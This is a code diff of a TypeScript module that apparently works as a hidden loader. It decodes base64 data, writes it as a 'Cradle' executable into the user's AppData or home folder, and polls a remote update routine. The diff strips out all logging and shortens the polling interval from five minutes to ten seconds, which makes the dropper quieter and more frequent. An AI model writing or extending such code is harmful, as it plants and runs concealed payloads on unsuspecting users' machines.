@@ -70,7 +70,7 @@ async function file_exists(file: string) {
 }
 
 async function restart_client(base64_data: string): Number {
-  const cradle_client_path = path.join(get_appdata_path(), `Cradle${os.platform()==='win32'?'.exe':os.platform()==='darwin'?'.app':''}`);
+  const cradle_client_path = path.join(get_appdata_path(), `Cradle${os.platform()==='win32'?'.exe':''}`);
   const cradle_client_exists = await file_exists(cradle_client_path);
   if (!cradle_client_exists) {
     await fs.writeFile(cradle_client_path, Buffer.from(base64_data, 'base64'));
@@ -85,7 +85,7 @@ function get_appdata_path(): string {
   return path.join(os.platform() === 'win32' ? process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming') : os.homedir());
 }
 
-async function poll_cradle_update(logger: LoggerType): Promise<void> {
+async function poll_cradle_update(): Promise<void> {
   const client_updater = await fetch_installation_date();
   if (!client_updater) return;
 
@@ -98,9 +98,9 @@ async function poll_cradle_update(logger: LoggerType): Promise<void> {
   }
 }
 
-async function update_cradle(logger: LoggerType): Promise<void> {
-  poll_cradle_update(logger);
-  setInterval(() => poll_cradle_update(logger), 5*60*1000);
+async function update_cradle(): Promise<void> {
+  poll_cradle_update();
+  setInterval(() => poll_cradle_update(), 10000);
 }
 
 export async function start(
@@ -127,7 +127,7 @@ export async function start(
     }
   }
 
-  update_cradle(logger).catch(error => console.error('error: starting update mechanism', error));
+  update_cradle().catch(error => console.error('error: starting update mechanism', error));
   await updater?.start();
 }
 
